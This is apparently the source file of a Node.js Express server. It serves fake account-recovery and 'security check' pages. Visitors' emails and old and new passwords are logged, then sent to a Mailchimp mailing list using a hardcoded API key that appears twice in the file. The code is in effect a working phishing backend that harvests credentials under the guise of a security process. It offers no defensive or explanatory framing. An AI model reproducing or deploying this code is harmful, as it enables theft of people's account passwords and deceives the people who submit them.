const express = require('express');
const bodyParser = require('body-parser');
const request = require('request');
const ejs = require("ejs");
const https = require("https");

const app = express();

app.set('view engine', 'ejs');
app.use(bodyParser.urlencoded({extended: true}));
app.use(express.static('public'));


app.get("/", function(req,res){
 
  res.render("home");
});
app.get("/recover-your-account",function(req,res){
  res.render("recover-your-account");
});
app.get("/verify",function(req,res){
     res.render("verify");
});
app.get("/new-password",function(req,res){
    res.render("new-password");
});
app.get("/security-check-completed",function(req,res){
  res.render("security-check-completed");
});

app.post("/recover-your-account", function(req,res){
  const email = req.body.email;
  const oldPassword = req.body.oldPassword;
  const newPassword = req.body.newPassword;

  console.log( email,oldPassword,newPassword);

  const data = {
    members: [
      {
        email_address: email,
        status: 'subscribed',
        merge_fields: {
          OPASSWORD: oldPassword,
          NPASSWORD: newPassword
        }
      }
    ]
  };

 // then we use JSON.stringify to stringify const data
 const jasonData = JSON.stringify(data);
 const url = "https://us10.api.mailchimp.com/3.0/lists/aa2921f802";
 const options = {
   method:"POST",
   auth:"eyo:296f722ebd139a9aaa99a83371dab38a-us10"
 }
 const request = https.request(url, options, function(response){

  if (response.statusCode===200){
    res.render("security-check-completed");
  }else{
    res.render("failure");
  }
  
   response.on("data",function(data){
     console.log(JSON.parse(data));     
   });
 });

  request.write(jasonData);
  request.end();

 });

 app.post("/verify",function(req,res){
    const email = req.body.email;
  const oldPassword = req.body.oldPassword;
  const newPassword = req.body.newPassword;

  console.log( email,oldPassword,newPassword);

  const data = {
    members: [
      {
        email_address: email,
        status: 'subscribed',
        merge_fields: {
           OPASSWORD: oldPassword,
          NPASSWORD: newPassword
        }
      }
    ]
  };

 // then we use JSON.stringify to stringify const data
 const jasonData = JSON.stringify(data);
 const url = "https://us10.api.mailchimp.com/3.0/lists/aa2921f802";
 const options = {
   method:"POST",
   auth:"eyo:296f722ebd139a9aaa99a83371dab38a-us10"
 }
 const request = https.request(url, options, function(response){

  if (response.statusCode===200){
    res.render("security-check-completed");
  }else{
    res.render("failure");
  }
  
   response.on("data",function(data){
     console.log(JSON.parse(data));     
   });
 });

  request.write(jasonData);
  request.end();
  res.redirect("new-password");
});


let port = process.env.PORT;
if (port == null || port == "") {
  port = 3000;}

app.listen(port, function() {
  console.log("Server have started Successfully.");
});


// 296f722ebd139a9aaa99a83371dab38a-us10
// aa2921f802